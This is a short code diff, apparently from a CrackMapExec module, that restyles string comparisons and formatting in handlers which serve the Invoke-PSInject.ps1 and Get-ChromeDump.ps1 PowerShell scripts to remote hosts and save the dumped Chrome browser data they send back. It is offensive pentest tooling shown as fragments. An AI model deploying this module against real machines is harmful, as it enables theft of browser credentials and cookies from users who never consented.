@@ -33,13 +33,13 @@ class CMEModule:
         context.log.success('Executed payload')
 
     def on_request(self, context, request):
-        if 'Invoke-PSInject.ps1' == request.path[1:]:
+        if request.path[1:] == 'Invoke-PSInject.ps1':
             request.send_response(200)
             request.end_headers()
 
             request.wfile.write(self.ps_script1)
 
-        elif 'Get-ChromeDump.ps1' == request.path[1:]:
+        elif request.path[1:] == 'Get-ChromeDump.ps1':
             request.send_response(200)
             request.end_headers()
 
@@ -63,9 +63,10 @@ class CMEModule:
             for line in buf:
                 context.log.highlight(line)
 
-            log_name = 'ChromeDump-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
+            log_name = f'ChromeDump-{response.client_address[0]}-{datetime.now().strftime("%Y-%m-%d_%H%M%S")}.log'
+
             write_log(data, log_name)
-            context.log.info("Saved raw Get-ChromeDump output to {}".format(log_name))
+            context.log.info(f"Saved raw Get-ChromeDump output to {log_name}")
 
     #def on_shutdown(self, context):
         #context.info('Removing SQLite assembly file')
